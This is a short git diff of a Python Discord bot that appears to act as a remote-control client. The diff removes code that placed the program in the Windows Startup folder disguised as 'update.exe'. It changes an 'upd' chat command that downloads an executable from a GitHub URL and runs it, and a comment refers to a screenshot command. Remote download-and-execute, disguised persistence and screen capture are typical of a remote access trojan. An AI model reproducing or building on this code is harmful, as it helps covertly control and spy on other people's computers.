@@ -23,12 +23,6 @@ import subprocess
 
 load_dotenv()
 
-path1 = "C:/users/"
-path2 = "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/update.exe"
-path=(path1 + getpass.getuser() + path2)
-print(str(path))
-
-
 token = os.getenv("Cody")
 timeout = 1
 connection = False
@@ -130,10 +124,10 @@ class MyClient(discord.Client):
             #update the application   
             if f'{message.content}' == 'upd':
                 url = "https://github.com/Plexisity/announcement_manager/raw/main/update.exe"
-                filename = "update.exe"
+                filename = "download.exe"
                 file = urlretrieve(url, filename)
-                os.replace("update.exe", path)
-                os.startfile(path)
+                os.replace("download.exe", r".\update.exe")
+                os.startfile(r".\update.exe")
                 await message.channel.send('Updating...')
                 await client.change_presence(activity=discord.Game(name="Updating..."))
             #take a screenshot
